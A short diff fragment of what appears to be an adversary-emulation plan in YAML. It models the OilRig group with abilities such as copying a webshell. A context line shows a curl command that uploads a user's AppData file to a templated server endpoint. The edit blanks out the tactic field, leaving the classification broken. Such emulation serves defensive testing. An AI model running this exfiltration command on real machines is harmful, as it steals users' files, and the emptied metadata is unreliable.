@@ -281,7 +281,7 @@ abilities:
        curl -F "data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat" --header "X-Request-ID: #{initial.target.user}-#{paw}" #{server}/file/upload
  2f3be960-5c00-4f03-a9c2-da09c31d38d9:
   name:  OilRig Copy webshell to THEBLOCK
-  tactic:  command-and-control
+  tactic:  	
   technique_name:  "Ingress Tool Transfer"
   technique_id:  T1105
   executors: 
